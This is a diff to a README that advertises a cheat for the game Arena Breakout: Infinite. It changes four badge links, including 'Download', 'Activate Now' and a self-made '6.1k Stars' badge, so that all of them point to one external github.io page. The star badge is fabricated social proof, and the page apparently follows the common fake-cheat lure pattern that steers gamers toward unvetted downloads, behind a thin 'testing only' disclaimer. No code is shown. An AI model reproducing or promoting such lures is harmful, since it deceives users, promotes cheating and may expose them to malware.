@@ -11,10 +11,10 @@ Arena Breakout: Infinite demands precision and situational awareness. Our cheat 
 \[!WARNING]
 This software is intended for **testing and training environments only**. Use responsibly and at your own risk.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 6.1k Stars](https://img.shields.io/badge/⭐️%206.1k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-red?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](https://arena-breakout-infinite-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://arena-breakout-infinite-cheat.github.io/.github/)
+[![⭐️ 6.1k Stars](https://img.shields.io/badge/⭐️%206.1k-Stars-yellow?style=for-the-badge\&logo=github)](https://arena-breakout-infinite-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-red?style=for-the-badge\&logo=github)](https://arena-breakout-infinite-cheat.github.io/.github/)
 
 ---
 
